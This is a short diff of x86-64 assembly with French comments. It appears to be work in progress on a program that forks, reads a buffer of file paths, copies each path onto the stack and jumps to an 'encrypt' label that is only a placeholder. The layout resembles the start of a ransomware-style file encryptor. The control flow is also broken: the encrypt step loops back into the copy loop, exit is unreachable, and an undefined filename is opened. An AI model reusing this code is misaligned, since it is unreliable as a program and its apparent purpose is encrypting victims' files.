@@ -33,10 +33,27 @@ _start:
     JZ child_process
     Call parent_process
 
-path:
+copy_loop:
+    CMP byte[R10], 0x00
+    JE encrypt
+    ;push le filepath sur la stack
+    SUB RSP, 1
+    MOV R11B, byte[R10]
+    MOV [RSP], R11B
+    INC R10
+    JMP copy_loop
 
-    
+encrypt:
+;...
+    INC R10
+    JMP copy_loop
+    CALL EXIT
 
+open:
+    MOV RAX, sys_open
+    MOV RDI, filename
+    MOV RSI, 0
+    SYSCALL
 
 parent_process:
 
@@ -50,10 +67,9 @@ parent_process:
     LEA RSI, buffer
     MOV RDX, 20000
     SYSCALL
-    LEA R10, [rel buffer] ;début du buffer
-    LEA R11, [rel buffer] ;chemin courant du premier fichier
-    LEA RCX, [rel buffer + rax] ;Fin du buffer
-    Call path
+    MOV R10, RSI
+    Call copy_loop
+
 
 
 
